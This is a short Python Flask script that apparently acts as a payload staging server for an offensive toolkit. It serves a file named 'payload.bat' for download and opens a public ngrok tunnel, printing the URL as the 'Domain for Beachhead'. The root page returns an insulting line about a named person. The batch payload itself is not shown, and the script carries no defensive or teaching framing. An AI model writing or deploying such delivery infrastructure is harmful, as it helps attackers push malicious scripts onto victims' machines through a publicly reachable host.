from flask import Flask, send_file
from pyngrok import ngrok
from threading import Thread
from time import sleep
import socket

app = Flask(__name__)

@app.route('/serve_payload')
def download():
    return send_file('../Payload/payload.bat', as_attachment=True)

@app.route("/")
def hello_world():
    return "Marcus is a Bum!"

def launch_ngrok():
    sleep(1)

    domain = ngrok.connect(5445).public_url
    print("Domain for Beachhead: ", domain)


if __name__ == '__main__':
    ngrokThread = Thread(target=launch_ngrok).start()
    app.run(port=5445)
    